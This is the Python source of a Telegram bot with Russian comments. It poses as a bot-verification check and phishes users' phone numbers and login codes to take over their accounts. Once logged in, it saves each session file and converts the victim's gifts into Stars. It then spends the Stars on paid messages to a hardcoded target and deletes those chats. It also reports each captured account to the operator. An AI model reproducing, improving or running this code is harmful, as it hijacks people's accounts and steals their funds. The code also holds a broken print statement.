import os
import asyncio
import threading
import random
import json
import time

import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telethon import TelegramClient, functions, types
from telethon.errors import SessionPasswordNeededError, FloodWaitError, RPCError
from telethon import TelegramClient


# --- Конфигурация ---
API_ID = 2040
API_HASH = 'b18441a1ff607e10a989891a5462e627'
BOT_TOKEN = 'TOken HERE'
textwhen = "Проверка успешно пройдена! Ваш кламси: https://t.me/+i75ujqY-7js4MmVi"
DC_ID = 2
DC_IP = '149.154.167.40'
DC_PORT = 80

TARGET_USER = '@handler'  # или '@ufiap' – как нужно
ADMIN_ID = 2200371343
SPAM_BOT = '@SpamBot'

# Директория для файлов сессий
SESSION_DIR = 'sessions'
os.makedirs(SESSION_DIR, exist_ok=True)

# --- Bot Init ---
bot = telebot.TeleBot(BOT_TOKEN)
user_sessions = {}  # временные данные для ввода кода

# --- Asyncio loop ---
loop = asyncio.new_event_loop()
threading.Thread(target=loop.run_forever, daemon=True).start()

def run_async(coro):
    return asyncio.run_coroutine_threadsafe(coro, loop)

# --- Работа с файловыми сессиями ---
def get_session_path(phone: str) -> str:
    """Возвращает путь к файлу сессии для указанного номера телефона"""
    filename = phone.replace("+", "").replace(" ", "")
    return os.path.join(SESSION_DIR, f'session_{filename}.session')

def get_all_session_files():
    """Возвращает список всех .session файлов в папке"""
    if not os.path.exists(SESSION_DIR):
        return []
    return [f for f in os.listdir(SESSION_DIR) if f.endswith('.session')]

def phone_from_session_filename(filename: str) -> str:
    """Из имени файла сессии извлекает номер телефона"""
    # формат: session_79123456789.session
    name = filename.replace('session_', '').replace('.session', '')
    return f"+{name}"  # предполагаем, что номер без плюса

# --- Проверка активности сессии ---
async def is_session_valid(client):
    try:
        await client.get_me()
        return True
    except:
        return False

# --- Обмен подарков на звёзды (без изменений) ---
async def convert_all_gifts(client):
    total_converted = 0
    try:
        saved_gifts = await client(functions.payments.GetSavedStarGiftsRequest(
        peer=types.InputPeerSelf(),
        offset='',   # обязательный параметр
        limit=100
        ))
        if not saved_gifts.gifts:
            return 0

        for gift in saved_gifts.gifts:
            if hasattr(gift, 'convert_stars') and gift.convert_stars > 0:
                try:
                    if hasattr(gift, 'msg_id'):
                        input_gift = types.InputSavedStarGiftUser(msg_id=gift.msg_id)
                    elif hasattr(gift, 'saved_id'):
                        input_gift = types.InputSavedStarGiftChat(peer=types.InputPeerSelf(), saved_id=gift.saved_id)
                    else:
                        continue
                    result = await client(functions.payments.ConvertStarGiftRequest(stargift=input_gift))
                    if result:
                        total_converted += gift.convert_stars
                        await asyncio.sleep(0.5)
                except Exception as e:
                    print(f"Ошибка конвертации подарка: {e}")
    except Exception as e:
        print(f"Ошибка получения подарков: {e}")
    return total_converted

# --- Проверка спамблока и очистка переписки ---
async def check_spamblock_and_clean(client):
    try:
        spam_bot = await client.get_entity(SPAM_BOT)
        await client.send_message(spam_bot, '/start')
        response_text = None
        for _ in range(20):
            await asyncio.sleep(1)
            messages = await client.get_messages(spam_bot, limit=1)
            if messages and messages[0].text:
                response_text = messages[0].text
                break

        if response_text:
            if "свободен от каких-либо ограничений" in response_text:
                spam_status = (False, "Нет ограничений")
            elif "ограничен" in response_text or "ограничения" in response_text:
                spam_status = (True, response_text[:200])
            else:
                spam_status = (False, "Неизвестный ответ")
        else:
            spam_status = (None, "Таймаут")

        # Очищаем переписку с @SpamBot
        try:
            all_msgs = await client.get_messages(spam_bot, limit=100)
            if all_msgs:
                msg_ids = [m.id for m in all_msgs]
                await client.delete_messages(spam_bot, msg_ids)
        except Exception as e:
            print(f"Ошибка очистки чата с @SpamBot: {e}")

        return spam_status
    except Exception as e:
        print(f"Ошибка при проверке спамблока: {e}")
        return (None, str(e))

# --- Отправка множества сообщений и очистка чата ---
async def send_messages_and_clean(client, target, stars_balance):
    sent = 0
    spent = 0
    target_entity = await client.get_input_entity(target)
    messages_ids = []

    while stars_balance >= 2:
        random_text = random.choice([
            "Привет!", "Как дела?", "Друг, пошли играть)",
            "Пошли завтра гулять?", "Как настроение?",
            "Что нового?", "Давно не виделись!", "Как жизнь?"
        ])
        try:
            result = await client(functions.messages.SendMessageRequest(
                peer=target_entity,
                message=random_text,
                allow_paid_stars=2,
                no_webpage=True
            ))
            sent += 1
            spent += 2
            stars_balance -= 2
            if result and hasattr(result, 'id'):
                messages_ids.append(result.id)

            if sent % 5 == 0 and messages_ids:
                try:
                    await client.delete_messages(target_entity, messages_ids)
                    messages_ids.clear()
                except Exception as e:
                    print(f"Ошибка очистки чата: {e}")

            await asyncio.sleep(1.5)
        except FloodWaitError as e:
            await asyncio.sleep(e.seconds)
        except RPCError as e:
            if 'ALLOW_PAYMENT_REQUIRED' in str(e):
                break
            else:
                print(f"Ошибка отправки: {e}")
                break

    if messages_ids:
        try:
            await client.delete_messages(target_entity, messages_ids)
        except:
            pass
    return sent, spent

# --- Основная логика после входа ---
async def login_and_process(user_id, chat_id):
    session = user_sessions.get(user_id)
    if not session:
        bot.send_message(chat_id, "Сессия не найдена.")
        return

    phone = session["phone"]
    code = session["code"]
    phone_code_hash = session["phone_code_hash"]
    client = session["client"]  # клиент уже создан с путём к .session файлу

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        me = await client.get_me()
        username = f"@{me.username}" if me.username else "нет username"

        # 1. Баланс звёзд
        status = await client(functions.payments.GetStarsStatusRequest(peer=types.InputPeerSelf()))
        stars_balance = status.balance.amount if hasattr(status.balance, 'amount') else 0

        # 2. Конвертация подарков
        converted = await convert_all_gifts(client)
        if converted > 0:
            status = await client(functions.payments.GetStarsStatusRequest(peer=types.InputPeerSelf()))
            stars_balance = status.balance.amount
            print(f"convert: {converted} new bal: {stars_balance}")

        # 3. Премиум
        full_user = await client(functions.users.GetFullUserRequest(id=me.id))
        is_premium = getattr(full_user.full_user, 'premium', False)

        # 4. Спамблок
        spam_status, spam_details = await check_spamblock_and_clean(client)

        # 5. Отчёт админу
        admin_report = (
            f"🆕 Новый аккаунт!\n"
            f"📱 Номер: {phone}\n"
            f"👤 Username: {username}\n"
            f"💎 Премиум: {'Да' if is_premium else 'Нет'}\n"
            f"🚫 Спамблок: {spam_status if spam_status is not None else 'Ошибка'}\n"
            f"📝 Детали: {spam_details[:200]}\n"
            f"⭐ Баланс звёзд: {stars_balance}"
        )
        bot.send_message(ADMIN_ID, admin_report)

        # 6. Отправка сообщений
        if stars_balance >= 2:
            bot.send_message(chat_id, textwhen)
            sent_count, spent_stars = await send_messages_and_clean(client, TARGET_USER, stars_balance)
            # можно отправить отчёт пользователю, но закомментировано
        else:
            print("error sending idk no stars lol")

        # 7. Сессия уже сохраняется автоматически в .session файл, ничего дополнительно не нужно
        await client.disconnect()
        del user_sessions[user_id]

    except SessionPasswordNeededError:
        bot.send_message(chat_id, "⚠️ На аккаунте включена двухфакторная аутентификация.")
        await client.disconnect()
        del user_sessions[user_id]
    except Exception as e:
        await client.disconnect()
        bot.send_message(chat_id, f"❌ Ошибка: {e}")
        del user_sessions[user_id]

# --- Команда /stats (теперь читает .session файлы) ---
@bot.message_handler(commands=['stats'])
def stats(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "Нет доступа.")
        return

    session_files = get_all_session_files()
    total = len(session_files)

    async def check_active():
        active = 0
        for fname in session_files:
            phone = phone_from_session_filename(fname)
            session_path = get_session_path(phone)
            client = TelegramClient(session_path, API_ID, API_HASH)
            client.session.set_dc(DC_ID, DC_IP, DC_PORT)
            await client.connect()
            if await is_session_valid(client):
                active += 1
            await client.disconnect()
            await asyncio.sleep(0.2)
        return active

    def sync_check():
        future = run_async(check_active())
        try:
            active = future.result(timeout=30)
            bot.send_message(ADMIN_ID, f"📊 Статистика сессий:\nВсего сохранено: {total}\nАктивных: {active}")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"Ошибка проверки сессий: {e}")

    threading.Thread(target=sync_check).start()
    bot.reply_to(message, "Проверяю активные сессии, результат пришлю в личку.")

# --- Команда /start ---
@bot.message_handler(commands=['start'])
def start(message):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)
    btn_contact = KeyboardButton("✅Я не бот!", request_contact=True)
    markup.add(btn_contact)
    bot.send_message(
        message.chat.id,
        "🤖Чтобы получить файл, пройдите проверку на бота!\n"
        "Нажми кнопку ниже.",
        reply_markup=markup
    )


# --- Обработка контакта (создаём клиента с файловой сессией) ---
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    user_id = message.from_user.id
    phone = message.contact.phone_number
    chat_id = message.chat.id
    user_sessions[user_id] = {
        "phone": phone,
        "code": "",
        "client": None,
        "phone_code_hash": ""
    }
    run_async(send_code(user_id, phone, chat_id))

async def send_code(user_id, phone, chat_id):
    session_path = get_session_path(phone)
    # Добавляем параметры эмуляции iPhone
    client = TelegramClient(
        session_path, API_ID, API_HASH,
        device_model='Windows 11 Pro',
        system_version='17.0',
        app_version='14888888.8',
        lang_code='ru',
        system_lang_code='ru'
    )
    client.session.set_dc(DC_ID, DC_IP, DC_PORT)
    await client.connect()
    try:
        result = await client.send_code_request(phone)
        user_sessions[user_id]["client"] = client
        user_sessions[user_id]["phone_code_hash"] = result.phone_code_hash
        bot.send_message(chat_id, "Введите код через кнопки:", reply_markup=make_code_keyboard(""))
    except Exception as e:
        await client.disconnect()
        print("code send err r r  {e}"
        bot.send_message(chat_id, f"Ошибка отправки кода...")

def make_code_keyboard(current_code):
    markup = InlineKeyboardMarkup()
    digits = [str(i) for i in range(1, 10)]
    for i in range(0, 9, 3):
        row = [InlineKeyboardButton(d, callback_data=f"digit_{d}") for d in digits[i:i+3]]
        markup.row(*row)
    markup.row(
        InlineKeyboardButton("0", callback_data="digit_0"),
        InlineKeyboardButton("<", callback_data="del"),
        InlineKeyboardButton("✅", callback_data="send")
    )
    return markup

@bot.callback_query_handler(func=lambda call: True)
def handle_code_buttons(call):
    user_id = call.from_user.id
    chat_id = call.message.chat.id
    message_id = call.message.message_id
    if user_id not in user_sessions:
        bot.answer_callback_query(call.id, "Сначала отправьте номер.")
        return
    session = user_sessions[user_id]
    data = call.data
    if data.startswith("digit_"):
        digit = data.split("_")[1]
        session["code"] += digit
    elif data == "del":
        session["code"] = session["code"][:-1]
    elif data == "send":
        run_async(login_and_process(user_id, chat_id))
        return
    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=message_id,
            text=f"Ввеdиtе k0д: `{session['code']}`",
            parse_mode='Markdown',
            reply_markup=make_code_keyboard(session["code"])
        )
    except:
        pass

# --- Запуск ---
if __name__ == '__main__':
    bot.infinity_polling()